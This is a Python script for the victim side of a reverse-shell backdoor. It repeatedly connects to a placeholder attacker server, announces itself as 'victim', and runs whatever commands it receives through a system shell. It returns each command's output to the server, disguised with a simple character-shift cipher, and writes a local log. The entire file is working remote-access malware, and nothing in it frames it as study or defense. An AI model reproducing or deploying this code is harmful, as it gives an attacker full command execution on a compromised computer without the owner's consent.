import socket
import os
from time import sleep
import subprocess
import sys
from datetime import datetime


# Address & Port of the server
SRV_IP   = "SERVER-IP"
SRV_PORT = 3216

sock = None
quit = False
connectedToSrv = False
logFile = open("logFile.txt", "a")

def nowTime():
    return f"[{datetime.now().strftime('%x %X')}] "

def logga(data):
    global logFile
    logFile.write(f"{nowTime()} {data}\n")
    logFile.close()
    logFile = open("logFile.txt", "a")



def connectToServer():
    global connectedToSrv, sock

    while not connectedToSrv:
        try:
            print("Connecting...")
            logga("Connecting to server...")
            # Create the socket and connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SRV_IP, SRV_PORT))
            connectedToSrv = True
            print("Connected successfully")
            logga("Connected successfully")
        except:
            # if cant connect retry
            sleep(300)  # 1 minute timeout
            print("Failed.")
            logga("Failed.")
            


def startGetCmds():
    global quit, connectedToSrv
    
    # Tell the server what type we are
    
    safeSend(sock, yutiCipher("victim", "e").encode() )
            
    # Main cycle
    while connectedToSrv: 
        # Recive the command
        cmd = safeRecv(sock, 4096)
    
        # Disconnected from server
        if (not cmd):
            connectedToSrv = False;
            #connectToServer()
        else:
            cmd = yutiCipher(cmd.decode(), "d")
        
        # CLOSE DEFENLTY THE CONNECTION
        if cmd == "/closeSession":
            safeSend(sock, "qui vittima, passo e chiudo")
            logga("qui vittima, passo e chiudo\n\n")
            sock.close()
            logFile.close()  
            sys.exit(0)  
        
        # Exec the command 
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout, stderr = proc.communicate()
        output = stdout.decode() + stderr.decode()
        if not output:
            output = "<NOTHING>"
    
        
        # Logging the output
        logga(f"{cmd}: {output}")

        # Send the output
        output = yutiCipher(output, "e")
        safeSend(sock, output.encode())
        # Close the process
        proc.terminate()
           
    sock.close()
    

def safeSend(sock, data):
    global connectedToSrv
    try:
        sock.send(data)
    except:
        connectedToSrv = False


def safeRecv(sock, buf):
    global connectedToSrv
    try:
        return sock.recv(buf)
    except:    
        connectedToSrv = False


def yutiCipher(data:str, mode:str):
    lenght = len(data)
    toShift = lenght
    if toShift > 13:
        toShift = 13

    output = ""

    if mode.lower() == 'e':
        for i in range(lenght):
            
            output += chr( ord(data[i]) + toShift) 

    elif mode.lower() == 'd':
        for i in range(lenght):
            output += chr( ord(data[i]) - toShift) 
    else:
        return None

    return output


# Running
try:
    connectToServer()
    startGetCmds()
except KeyboardInterrupt:
    sock.close()
    print("End.")

